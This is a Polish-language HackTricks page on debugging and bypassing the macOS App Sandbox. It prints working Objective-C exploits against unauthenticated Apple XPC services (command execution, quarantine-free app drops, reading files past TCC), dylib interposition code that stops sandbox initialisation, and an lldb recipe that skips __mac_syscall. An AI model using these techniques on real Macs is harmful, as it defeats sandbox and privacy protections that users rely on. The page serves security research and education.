# macOS Sandbox: debugowanie i Bypass

{{#include ../../../../../banners/hacktricks-training.md}}

## Proces ładowania Sandbox

<figure><img src="../../../../../images/image (901).png" alt=""><figcaption><p>Obraz z <a href="http://newosxbook.com/files/HITSB.pdf">http://newosxbook.com/files/HITSB.pdf</a></p></figcaption></figure>

Na poprzednim obrazie można zobaczyć, **jak ładowany jest Sandbox**, gdy uruchamiana jest aplikacja z entitlementem **`com.apple.security.app-sandbox`**.

Kompilator linkuje `/usr/lib/libSystem.B.dylib` z plikiem binarnym.

Następnie **`libSystem.B`** wywołuje kilka funkcji, aż **`xpc_pipe_routine`** prześle entitlementy aplikacji do **`securityd`**. Securityd sprawdza, czy proces powinien zostać odizolowany w Sandboxie i, jeśli tak, izoluje go.\
Na koniec Sandbox zostaje aktywowany przez wywołanie **`__sandbox_ms`**, które wywołuje **`__mac_syscall`**.<sup>[[1]](#references)[[3]](#references)</sup>

## Możliwe metody Bypass

### Ominięcie atrybutu kwarantanny

**Pliki tworzone przez procesy działające w Sandboxie** otrzymują **atrybut kwarantanny**, aby zapobiec ucieczce z Sandboxa: jeśli upuścisz nową aplikację i spróbujesz ją uruchomić, flaga kwarantanny ją zablokuje. Dlatego **jeśli możesz upuścić plik lub folder *bez* atrybutu kwarantanny, możesz uciec z App Sandbox** — wystarczy upuścić pakiet `.app` i uruchomić go za pomocą `open`, ponieważ nowo uruchomiony proces działa w ramach LaunchServices, a nie w Twoim Sandboxie.

Niezawodnym sposobem na **upuszczenie pliku bez kwarantanny** jest poproszenie **innego procesu o utworzenie go**. Jak opisano w [**A New Era of macOS Sandbox Escapes**](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/) autorstwa Mickey’ego Jina, **App Sandbox** oznacza upuszczone pliki kwarantanną, ale **usługi XPC działające w ramach Service Sandbox tego nie robią**. Można więc wykorzystać kilka nieuwierzytelnionych usług XPC jako prymityw „prania kwarantanny”:<sup>[[4]](#references)</sup>

- **CVE-2023-27944** (`TrialArchivingService`) i **CVE-2023-32414** (`ArchiveService`): rozpakowują archiwum przekazane przez aplikację działającą w Sandboxie do wybranej lokalizacji, **nie przenosząc atrybutu xattr kwarantanny** na rozpakowaną zawartość.
- **CVE-2023-42977** (`PerfPowerServicesSignpostReader`): path traversal w `submitSignpostDataWithConfig:` umożliwiał tworzenie **dowolnych katalogów bez kwarantanny**, co wystarcza do utworzenia całej struktury pakietu `.app` poza kontenerem.
- **CVE-2024-27864** (`diskimagescontroller.xpc`): montuje obraz DMG objęty kwarantanną, **nie obejmując kwarantanną urządzenia wynikowego**, dzięki czemu można uruchamiać aplikacje z zamontowanego woluminu.

> [!TIP]
> Rozpakowywanie zwykle **usuwa bit uprawnień do wykonywania**. Obejście zastosowane w CVE-2023-27944 polegało na umieszczeniu **symlinka** do istniejącego, podpisanego pliku binarnego systemu (np. `/System/Library/CoreServices/Automator Application Stub`) jako głównego pliku wykonywalnego pakietu. Dzięki temu można go uruchomić bez konieczności ustawiania `+x` na upuszczonym pliku.

> [!CAUTION]
> Działa to dlatego, że kontrola opiera się na **fladze elementu, który jest uruchamiany**: *„Gdy aplikacja lub inny kod wykonywalny jest uruchamiany z Findera lub GUI, macOS sprawdza jego flagę kwarantanny”*, a dopiero potem *„przekazuje go Gatekeeperowi do pełnych kontroli bezpieczeństwa przy pierwszym uruchomieniu”* ([Explainer: Quarantine](https://eclecticlight.co/2021/12/11/explainer-quarantine/)). Brak flagi na uruchamianym pakiecie oznacza brak kontroli Gatekeepera — dokładnie taki prymityw zapewniają powyższe CVE.<sup>[[5]](#references)</sup>
>
> Zauważ, że jeśli pakiet `.app` został już zatwierdzony do uruchomienia (ma atrybut xattr kwarantanny z flagą „authorized to run”), można go również nadużyć... z tą różnicą, że teraz nie można zapisywać wewnątrz pakietów **`.app`**, jeśli nie ma się uprzywilejowanych uprawnień TCC (których nie będziesz mieć w Sandboxie).

### Nadużywanie funkcji Open

W [**ostatnich przykładach obejścia Sandboxa w Wordzie**](macos-office-sandbox-bypasses.md#word-sandbox-bypass-via-login-items-and-.zshenv) można zobaczyć, jak funkcję CLI **`open`** można nadużyć do ominięcia Sandboxa.


{{#ref}}
macos-office-sandbox-bypasses.md
{{#endref}}

### Launch Agents/Daemons

Nawet jeśli aplikacja **ma działać w Sandboxie** (`com.apple.security.app-sandbox`), można ominąć Sandbox, jeśli aplikacja zostanie **uruchomiona z LaunchAgent** (na przykład `~/Library/LaunchAgents`).\
Jak wyjaśniono w [**tym poście**](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818), aby uzyskać trwałość za pomocą aplikacji działającej w Sandboxie, można skonfigurować jej automatyczne uruchamianie jako LaunchAgent i być może wstrzyknąć złośliwy kod za pomocą zmiennych środowiskowych DyLib.<sup>[[6]](#references)</sup>

### Nadużywanie lokalizacji autostartu

Jeśli proces działający w Sandboxie może **zapisywać** w miejscu, w którym **później aplikacja działająca poza Sandboxem uruchomi plik binarny**, będzie mógł **uciec z Sandboxa, po prostu umieszczając tam** plik binarny. Dobrymi przykładami takich lokalizacji są `~/Library/LaunchAgents` i `/System/Library/LaunchDaemons`.

Może to wymagać nawet **2 kroków**: uruchomienia kodu przez proces działający w **bardziej permisywnym Sandboxie** (`file-read*`, `file-write*`), tak aby kod zapisał plik w miejscu, z którego zostanie **uruchomiony poza Sandboxem**.

Sprawdź tę stronę dotyczącą **lokalizacji autostartu**:


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

### Nadużywanie innych procesów

Jeśli z procesu działającego w Sandboxie możesz **przejąć kontrolę nad innymi procesami** działającymi w mniej restrykcyjnych Sandboxach (lub poza nimi), będziesz mógł uciec do ich Sandboxów:


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

### Dostępne systemowe i użytkownika usługi Mach

Sandbox pozwala również komunikować się z niektórymi **usługami Mach** za pośrednictwem XPC zdefiniowanych w profilu `application.sb`. Jeśli możesz **nadużyć** jednej z tych usług, być może uda Ci się **uciec z Sandboxa**.

Jak wskazano w [tym writeupie](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/), informacje o usługach Mach są przechowywane w `/System/Library/xpc/launchd.plist`. Wszystkie systemowe usługi Mach i usługi Mach użytkownika można znaleźć, wyszukując w tym pliku `<string>System</string>` i `<string>User</string>`.<sup>[[4]](#references)</sup>

Ponadto można sprawdzić, czy usługa Mach jest dostępna dla aplikacji działającej w Sandboxie, wywołując `bootstrap_look_up`:

```objectivec
void checkService(const char *serviceName) {
    mach_port_t service_port = MACH_PORT_NULL;
    kern_return_t err = bootstrap_look_up(bootstrap_port, serviceName, &service_port);
    if (!err) {
      NSLog(@"available service:%s", serviceName);
      mach_port_deallocate(mach_task_self_, service_port);
    }
}

void print_available_xpc(void) {
    NSDictionary<NSString*, id>* dict = [NSDictionary dictionaryWithContentsOfFile:@"/System/Library/xpc/launchd.plist"];
    NSDictionary<NSString*, id>* launchDaemons = dict[@"LaunchDaemons"];
    for (NSString* key in launchDaemons) {
      NSDictionary<NSString*, id>* job = launchDaemons[key];
      NSDictionary<NSString*, id>* machServices = job[@"MachServices"];
      for (NSString* serviceName in machServices) {
          checkService(serviceName.UTF8String);
      }
    }
}
```

### Dostępne usługi Mach PID

Te usługi Mach zostały po raz pierwszy wykorzystane do [ucieczki z sandboxa w tym artykule](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/). W tamtym czasie **wszystkie usługi XPC wymagane** przez aplikację i jej framework były widoczne w domenie PID aplikacji (są to usługi Mach z `ServiceType` ustawionym na `Application`).<sup>[[4]](#references)</sup>

Aby **nawiązać kontakt z usługą XPC w domenie PID**, wystarczy zarejestrować ją w aplikacji za pomocą wiersza takiego jak:

```objectivec
[[NSBundle bundleWithPath:@“/System/Library/PrivateFrameworks/ShoveService.framework"]load];
```

Ponadto można znaleźć wszystkie usługi Mach **Application**, wyszukując `<string>Application</string>` w `System/Library/xpc/launchd.plist`.

Innym sposobem na znalezienie prawidłowych usług xpc jest sprawdzenie tych znajdujących się w:

```bash
find /System/Library/Frameworks -name "*.xpc"
find /System/Library/PrivateFrameworks -name "*.xpc"
```

Kilka przykładów wykorzystujących tę technikę można znaleźć w [**oryginalnym opisie**](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/), poniżej przedstawiono jednak kilka podsumowanych przykładów.<sup>[[4]](#references)</sup>

#### /System/Library/PrivateFrameworks/StorageKit.framework/XPCServices/storagekitfsrunner.xpc

Ta usługa zezwala na każde połączenie XPC, zawsze zwracając `YES`, a metoda `runTask:arguments:withReply:` wykonuje dowolne polecenie z dowolnymi parametrami.

Exploit był „tak prosty jak”:

```objectivec
@protocol SKRemoteTaskRunnerProtocol
-(void)runTask:(NSURL *)task arguments:(NSArray *)args withReply:(void (^)(NSNumber *, NSError *))reply;
@end

void exploit_storagekitfsrunner(void) {
    [[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/StorageKit.framework"] load];
    NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.storagekitfsrunner"];
    conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(SKRemoteTaskRunnerProtocol)];
    [conn setInterruptionHandler:^{NSLog(@"connection interrupted!");}];
    [conn setInvalidationHandler:^{NSLog(@"connection invalidated!");}];
    [conn resume];
    
    [[conn remoteObjectProxy] runTask:[NSURL fileURLWithPath:@"/usr/bin/touch"] arguments:@[@"/tmp/sbx"] withReply:^(NSNumber *bSucc, NSError *error) {
        NSLog(@"run task result:%@, error:%@", bSucc, error);
    }];
}
```

#### /System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework/XPCServices/AudioAnalyticsHelperService.xpc

Ta usługa XPC zezwalała każdemu klientowi, zawsze zwracając `YES`, a metoda `createZipAtPath:hourThreshold:withReply:` przyjmowała ścieżkę do folderu i kompresowała go do pliku ZIP.

Dzięki temu można utworzyć fałszywą strukturę katalogów aplikacji, skompresować ją, a następnie zdekompresować i uruchomić, aby uciec z sandboxa, ponieważ nowe pliki nie będą miały atrybutu kwarantanny.

Exploit wyglądał następująco:

```objectivec
@protocol AudioAnalyticsHelperServiceProtocol
-(void)pruneZips:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
-(void)createZipAtPath:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
@end
void exploit_AudioAnalyticsHelperService(void) {
    NSString *currentPath = NSTemporaryDirectory();
    chdir([currentPath UTF8String]);
    NSLog(@"======== preparing payload at the current path:%@", currentPath);
    system("mkdir -p compressed/poc.app/Contents/MacOS; touch 1.json");
    [@"#!/bin/bash\ntouch /tmp/sbx\n" writeToFile:@"compressed/poc.app/Contents/MacOS/poc" atomically:YES encoding:NSUTF8StringEncoding error:0];
    system("chmod +x compressed/poc.app/Contents/MacOS/poc");
    
    [[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework"] load];
    NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.internal.audioanalytics.helper"];
    conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(AudioAnalyticsHelperServiceProtocol)];
    [conn resume];
    
    [[conn remoteObjectProxy] createZipAtPath:currentPath hourThreshold:0 withReply:^(id *error){
        NSDirectoryEnumerator *dirEnum = [[[NSFileManager alloc] init] enumeratorAtPath:currentPath];
        NSString *file;
        while ((file = [dirEnum nextObject])) {
            if ([[file pathExtension] isEqualToString: @"zip"]) {
                // open the zip
                NSString *cmd = [@"open " stringByAppendingString:file];
                system([cmd UTF8String]);

                sleep(3); // wait for decompression and then open the payload (poc.app)
                NSString *cmd2 = [NSString stringWithFormat:@"open /Users/%@/Downloads/%@/poc.app", NSUserName(), [file stringByDeletingPathExtension]];
                system([cmd2 UTF8String]);
                break;
            }
        }
    }];
}
```

#### /System/Library/PrivateFrameworks/WorkflowKit.framework/XPCServices/ShortcutsFileAccessHelper.xpc

Ta usługa XPC umożliwia przyznanie klientowi XPC dostępu do odczytu i zapisu pod dowolnym adresem URL za pomocą metody `extendAccessToURL:completion:`, która akceptowała każde połączenie. Ponieważ usługa XPC ma FDA, można nadużyć tych uprawnień, aby całkowicie ominąć TCC.

Exploit wyglądał następująco:

```objectivec
@protocol WFFileAccessHelperProtocol
- (void) extendAccessToURL:(NSURL *) url completion:(void (^) (FPSandboxingURLWrapper *, NSError *))arg2;
@end
typedef int (*PFN)(const char *);
void expoit_ShortcutsFileAccessHelper(NSString *target) {
    [[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/WorkflowKit.framework"]load];
    NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.WorkflowKit.ShortcutsFileAccessHelper"];
    conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(WFFileAccessHelperProtocol)];
    [conn.remoteObjectInterface setClasses:[NSSet setWithArray:@[[NSError class], objc_getClass("FPSandboxingURLWrapper")]] forSelector:@selector(extendAccessToURL:completion:) argumentIndex:0 ofReply:1];
    [conn resume];
    
    [[conn remoteObjectProxy] extendAccessToURL:[NSURL fileURLWithPath:target] completion:^(FPSandboxingURLWrapper *fpWrapper, NSError *error) {
        NSString *sbxToken = [[NSString alloc] initWithData:[fpWrapper scope] encoding:NSUTF8StringEncoding];
        NSURL *targetURL = [fpWrapper url];
        
        void *h = dlopen("/usr/lib/system/libsystem_sandbox.dylib", 2);
        PFN sandbox_extension_consume = (PFN)dlsym(h, "sandbox_extension_consume");
        if (sandbox_extension_consume([sbxToken UTF8String]) == -1)
            NSLog(@"Fail to consume the sandbox token:%@", sbxToken);
        else {
            NSLog(@"Got the file R&W permission with sandbox token:%@", sbxToken);
            NSLog(@"Read the target content:%@", [NSData dataWithContentsOfURL:targetURL]);
        }
    }];
}
```

### Kompilacja statyczna i dynamiczne linkowanie

[**To badanie**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/) wykazało 2 sposoby na ominięcie Sandboxa. Sandbox jest nakładany w przestrzeni użytkownika podczas ładowania biblioteki **libSystem**. Gdyby plik binarny mógł uniknąć jej załadowania, nigdy nie zostałby objęty Sandboxem:<sup>[[2]](#references)</sup>

- Gdyby plik binarny został **w pełni skompilowany statycznie**, mógłby uniknąć załadowania tej biblioteki.
- Jeśli **plik binarny nie musiałby ładować żadnych bibliotek** (ponieważ linker również znajduje się w libSystem), nie musiałby ładować libSystem.

### Shellcode

Pamiętaj, że **nawet shellcode** na ARM64 wymaga linkowania z `libSystem.dylib`:

```bash
ld -o shell shell.o -macosx_version_min 13.0
ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
```

### Ograniczenia nie są dziedziczone

Jak wyjaśniono w **[dodatkowej części tego opracowania](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)**, ograniczenie sandboxa takie jak:<sup>[[4]](#references)</sup>

```
(version 1)
(allow default)
(deny file-write* (literal "/private/tmp/sbx"))
```

można obejść, uruchamiając nowy proces, na przykład:

```bash
mkdir -p /tmp/poc.app/Contents/MacOS
echo '#!/bin/sh\n touch /tmp/sbx' > /tmp/poc.app/Contents/MacOS/poc
chmod +x /tmp/poc.app/Contents/MacOS/poc
open /tmp/poc.app
```

Jednak oczywiście ten nowy proces nie odziedziczy uprawnień ani przywilejów procesu nadrzędnego.

### Zastąpienie odziedziczonego sandboxa atrybutami spawn (starsze wersje macOS)

Proces potomny utworzony za pomocą zwykłego `posix_spawn()` dziedziczy sandbox procesu nadrzędnego. W kompilacjach macOS sprzed poprawki z lutego 2026 r. proces nadrzędny działający w sandboxie mógł zamiast tego przekazać **wbudowaną nazwę profilu** do polityki MAC `Sandbox` za pomocą `posix_spawnattr_setmacpolicyinfo_np()`. Proces potomny otrzymywał wtedy ten profil *zamiast* ograniczeń procesu nadrzędnego. Wbudowany profil `no-network` nadal zezwalał na dostęp do katalogu domowego użytkownika, więc proces potomny, taki jak `/bin/bash`, mógł działać na plikach, do których proces nadrzędny App Sandbox nie miał dostępu. Różni się to od [ścieżki LaunchServices `open`](#not-inherited-restrictions), w której oddzielna usługa uruchamia proces. Zobacz [atrybuty spawn specyficzne dla polityki MACF](../../macos-macf-mandatory-access-control-framework.md#policy-specific-spawn-attributes-as-a-macf-input), aby poznać ogólną ścieżkę przekazywania danych wejściowych.<sup>[[7]](#references)</sup>

Aby przetestować tę granicę na **podatnym, odizolowanym hoście macOS**, utwórz nieszkodliwy plik canary w katalogu domowym, poza kontenerem aplikacji. Uruchom ten sam proces potomny z procesu nadrzędnego działającego już w sandboxie: najpierw za pomocą zwykłego `posix_spawn()`, a następnie z użyciem blobu atrybutów spawn Sandbox wybierającego `no-network`; porównaj, czy proces potomny może odczytać plik canary. Poniższy fragment korzysta z prywatnej definicji `sandbox_spawnattr_t` i deklaracji funkcji z [sample launcher](https://gist.github.com/Siguza/e9e6e2387b11ee5aec1b1c27c60d43ec) Siguzy. Podczas integrowania go z aplikacją testową dodaj standardową obsługę błędów.<sup>[[7]](#references)[[8]](#references)</sup>

```c
sandbox_spawnattr_t sb;
posix_spawnattr_t attr;
pid_t pid;
char *argv[] = {"/bin/bash", "-c", "cat \"$HOME/sandbox-canary.txt\"", NULL};
sandbox_spawnattrs_init(&sb);
sandbox_spawnattrs_setprofilename(&sb, "no-network");
posix_spawnattr_init(&attr);
posix_spawnattr_setmacpolicyinfo_np(&attr, "Sandbox", &sb, sizeof(sb));
int err = posix_spawn(&pid, "/bin/bash", NULL, &attr, argv, environ);
if (!err) waitpid(pid, NULL, 0);
```

Pomyślny zwrot `posix_spawn()` nie dowodzi, że doszło do ucieczki: sprawdź **efektywny dostęp dziecka do plików** i porównaj go ze standardowym zachowaniem zwykłego procesu potomnego. Załatane systemy odrzucają żądanie wbudowanego profilu przez wywołującego, który już działa w sandboxie, chyba że ma on prywatny entitlement `com.apple.private.security.sandbox-spawnattrs`. Nie traktuj tego historycznego zachowania jako obecnego obejścia.<sup>[[7]](#references)</sup>

### Entitlements

Pamiętaj, że niektóre **działania** mogą być **dozwolone przez sandbox**, jeśli aplikacja ma określony **entitlement**, na przykład:

```scheme
(when (entitlement "com.apple.security.network.client")
      (allow network-outbound (remote ip))
      (allow mach-lookup
             (global-name "com.apple.airportd")
             (global-name "com.apple.cfnetwork.AuthBrokerAgent")
             (global-name "com.apple.cfnetwork.cfnetworkagent")
             [...]
```

### Interposting Bypass

Więcej informacji o **Interposting** znajdziesz tutaj:


{{#ref}}
../../../macos-proces-abuse/macos-function-hooking.md
{{#endref}}

#### Interpostuj `_libsecinit_initializer`, aby zapobiec uruchomieniu sandboxa

```c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>

void _libsecinit_initializer(void);

void overriden__libsecinit_initializer(void) {
    printf("_libsecinit_initializer called\n");
}

__attribute__((used, section("__DATA,__interpose"))) static struct {
	void (*overriden__libsecinit_initializer)(void);
	void (*_libsecinit_initializer)(void);
}
_libsecinit_initializer_interpose = {overriden__libsecinit_initializer, _libsecinit_initializer};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
_libsecinit_initializer called
Sandbox Bypassed!
```

#### Interpose __mac_syscall, aby zapobiec działaniu Sandboxa

```c:interpose.c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>
#include <string.h>

// Forward Declaration
int __mac_syscall(const char *_policyname, int _call, void *_arg);

// Replacement function
int my_mac_syscall(const char *_policyname, int _call, void *_arg) {
    printf("__mac_syscall invoked. Policy: %s, Call: %d\n", _policyname, _call);
    if (strcmp(_policyname, "Sandbox") == 0 && _call == 0) {
        printf("Bypassing Sandbox initiation.\n");
        return 0; // pretend we did the job without actually calling __mac_syscall
    }
    // Call the original function for other cases
    return __mac_syscall(_policyname, _call, _arg);
}

// Interpose Definition
struct interpose_sym {
    const void *replacement;
    const void *original;
};

// Interpose __mac_syscall with my_mac_syscall
__attribute__((used)) static const struct interpose_sym interposers[] __attribute__((section("__DATA, __interpose"))) = {
    { (const void *)my_mac_syscall, (const void *)__mac_syscall },
};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand

__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 0
Bypassing Sandbox initiation.
__mac_syscall invoked. Policy: Quarantine, Call: 87
__mac_syscall invoked. Policy: Sandbox, Call: 4
Sandbox Bypassed!
```

### Debugowanie i omijanie Sandbox za pomocą lldb

Skompilujmy aplikację, która powinna działać w Sandbox:

{{#tabs}}
{{#tab name="sand.c"}}

```c
#include <stdlib.h>
int main() {
    system("cat ~/Desktop/del.txt");
}
```

{{#endtab}}

{{#tab name="entitlements.xml"}}

```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>com.apple.security.app-sandbox</key>
<true/>
</dict>
</plist>
```

{{#endtab}}

{{#tab name="Info.plist"}}

```xml
<plist version="1.0">
<dict>
    <key>CFBundleIdentifier</key>
    <string>xyz.hacktricks.sandbox</string>
    <key>CFBundleName</key>
    <string>Sandbox</string>
</dict>
</plist>
```

{{#endtab}}
{{#endtabs}}

Następnie skompiluj aplikację:

```bash
# Compile it
gcc -Xlinker -sectcreate -Xlinker __TEXT -Xlinker __info_plist -Xlinker Info.plist sand.c -o sand

# Create a certificate for "Code Signing"

# Apply the entitlements via signing
codesign -s <cert-name> --entitlements entitlements.xml sand
```

> [!CAUTION]
> Aplikacja spróbuje **odczytać** plik **`~/Desktop/del.txt`**, na co **Sandbox nie pozwoli**.\
> Utwórz tam plik, ponieważ po obejściu Sandbox aplikacja będzie mogła go odczytać:
>
> ```bash
> echo "Sandbox Bypassed" > ~/Desktop/del.txt
> ```

Zdebugujmy aplikację, aby sprawdzić, kiedy ładowany jest Sandbox:

```bash
# Load app in debugging
lldb ./sand

# Set breakpoint in xpc_pipe_routine
(lldb) b xpc_pipe_routine

# run
(lldb) r

# This breakpoint is reached by different functionalities
# Check in the backtrace is it was de sandbox one the one that reached it
# We are looking for the one libsecinit from libSystem.B, like the following one:
(lldb) bt
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
  * frame #0: 0x00000001873d4178 libxpc.dylib`xpc_pipe_routine
    frame #1: 0x000000019300cf80 libsystem_secinit.dylib`_libsecinit_appsandbox + 584
    frame #2: 0x00000001874199c4 libsystem_trace.dylib`_os_activity_initiate_impl + 64
    frame #3: 0x000000019300cce4 libsystem_secinit.dylib`_libsecinit_initializer + 80
    frame #4: 0x0000000193023694 libSystem.B.dylib`libSystem_initializer + 272

# To avoid lldb cutting info
(lldb) settings set target.max-string-summary-length 10000

# The message is in the 2 arg of the xpc_pipe_routine function, get it with:
(lldb) p (char *) xpc_copy_description($x1)
(char *) $0 = 0x000000010100a400 "<dictionary: 0x6000026001e0> { count = 5, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REGISTRATION_MESSAGE_SHORT_NAME_KEY\" => <string: 0x600000c00d80> { length = 4, contents = \"sand\" }\n\t\"SECINITD_REGISTRATION_MESSAGE_IMAGE_PATHS_ARRAY_KEY\" => <array: 0x600000c00120> { count = 42, capacity = 64, contents =\n\t\t0: <string: 0x600000c000c0> { length = 14, contents = \"/tmp/lala/sand\" }\n\t\t1: <string: 0x600000c001e0> { length = 22, contents = \"/private/tmp/lala/sand\" }\n\t\t2: <string: 0x600000c000f0> { length = 26, contents = \"/usr/lib/libSystem.B.dylib\" }\n\t\t3: <string: 0x600000c00180> { length = 30, contents = \"/usr/lib/system/libcache.dylib\" }\n\t\t4: <string: 0x600000c00060> { length = 37, contents = \"/usr/lib/system/libcommonCrypto.dylib\" }\n\t\t5: <string: 0x600000c001b0> { length = 36, contents = \"/usr/lib/system/libcompiler_rt.dylib\" }\n\t\t6: <string: 0x600000c00330> { length = 33, contents = \"/usr/lib/system/libcopyfile.dylib\" }\n\t\t7: <string: 0x600000c00210> { length = 35, contents = \"/usr/lib/system/libcorecry"...

# The 3 arg is the address were the XPC response will be stored
(lldb) register read x2
  x2 = 0x000000016fdfd660

# Move until the end of the function
(lldb) finish

# Read the response
## Check the address of the sandbox container in SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY
(lldb) memory read -f p 0x000000016fdfd660 -c 1
0x16fdfd660: 0x0000600003d04000
(lldb) p (char *) xpc_copy_description(0x0000600003d04000)
(char *) $4 = 0x0000000100204280 "<dictionary: 0x600003d04000> { count = 7, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ID_KEY\" => <string: 0x600000c04d50> { length = 22, contents = \"xyz.hacktricks.sandbox\" }\n\t\"SECINITD_REPLY_MESSAGE_QTN_PROC_FLAGS_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY\" => <string: 0x600000c04e10> { length = 65, contents = \"/Users/carlospolop/Library/Containers/xyz.hacktricks.sandbox/Data\" }\n\t\"SECINITD_REPLY_MESSAGE_SANDBOX_PROFILE_DATA_KEY\" => <data: 0x600001704100>: { length = 19027 bytes, contents = 0x0000f000ba0100000000070000001e00350167034d03c203... }\n\t\"SECINITD_REPLY_MESSAGE_VERSION_NUMBER_KEY\" => <int64: 0xaa3e660cef06712f>: 1\n\t\"SECINITD_MESSAGE_TYPE_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_FAILURE_CODE\" => <uint64: 0xaabe660cef067127>: 0\n}"

# To bypass the sandbox we need to skip the call to __mac_syscall
# Lets put a breakpoint in __mac_syscall when x1 is 0 (this is the code to enable the sandbox)
(lldb) breakpoint set --name __mac_syscall --condition '($x1 == 0)'
(lldb) c

# The 1 arg is the name of the policy, in this case "Sandbox"
(lldb) memory read -f s $x0
0x19300eb22: "Sandbox"

#
# BYPASS
#

# Due to the previous bp, the process will be stopped in:
Process 2517 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
    frame #0: 0x0000000187659900 libsystem_kernel.dylib`__mac_syscall
libsystem_kernel.dylib`:
->  0x187659900 <+0>:  mov    x16, #0x17d
    0x187659904 <+4>:  svc    #0x80
    0x187659908 <+8>:  b.lo   0x187659928               ; <+40>
    0x18765990c <+12>: pacibsp

# To bypass jump to the b.lo address modifying some registers first
(lldb) breakpoint delete 1 # Remove bp
(lldb) register write $pc 0x187659928 #b.lo address
(lldb) register write $x0 0x00
(lldb) register write $x1 0x00
(lldb) register write $x16 0x17d
(lldb) c
Process 2517 resuming
Sandbox Bypassed!
Process 2517 exited with status = 0 (0x00000000)
```

> [!WARNING] > **Nawet po ominięciu Sandboxa TCC zapyta użytkownika, czy zezwolić procesowi na odczyt plików z pulpitu**

## References

- [1] [Jonathan Levin - Apple Sandbox: głębiej w odmętach (slajdy HITB GSEC 2016)](http://newosxbook.com/files/HITSB.pdf)
- [2] [Saagar Jha - Ucieczka z Sandboxa Mac App Store](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)
- [3] [Jonathan Levin - Apple Sandbox: głębiej w odmętach (HITB GSEC 2016)](https://www.youtube.com/watch?v=mG715HcDgO8)
- [4] [Mickey Jin - Nowa era ucieczek z macOS Sandbox](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/) (unquarantined drops via XPC services: CVE-2023-27944, CVE-2023-32414, CVE-2023-42977, CVE-2024-27864)
- [5] [The Eclectic Light Company - Objaśnienie: kwarantanna](https://eclecticlight.co/2021/12/11/explainer-quarantine/)
- [6] [Vicarius vSociety - CVE-2023-26818 (Sandbox): TCC Bypass w macOS z użyciem Telegrama i DyLib Injection (część 2)](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818)
- [7] [Ucieczka z Apple Sandbox przez uruchomienie pliku wykonywalnego](https://wts.dev/posts/sandbox-spawnattrs-escape/)
- [8] [Siguza - sandbox-exec, ale dla wbudowanych profili](https://gist.github.com/Siguza/e9e6e2387b11ee5aec1b1c27c60d43ec)
{{#include ../../../../../banners/hacktricks-training.md}}
